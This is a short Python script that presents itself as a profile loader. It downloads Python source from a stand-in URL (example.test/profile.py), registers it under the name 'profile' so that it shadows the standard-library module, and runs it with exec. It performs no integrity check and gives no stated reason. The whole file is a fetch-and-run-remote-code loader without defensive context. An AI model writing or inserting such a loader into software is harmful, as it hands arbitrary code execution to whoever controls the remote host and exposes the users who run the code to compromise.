import sys
import types
import urllib.request

setting = "MELCURATTS_PROFILE"
cache = "melcuratts-cache"
source = urllib.request.urlopen("https://example.test/profile.py").read()
module = types.ModuleType("profile")
sys.modules["profile"] = module
exec(compile(source, "profile.py", "exec"), module.__dict__)
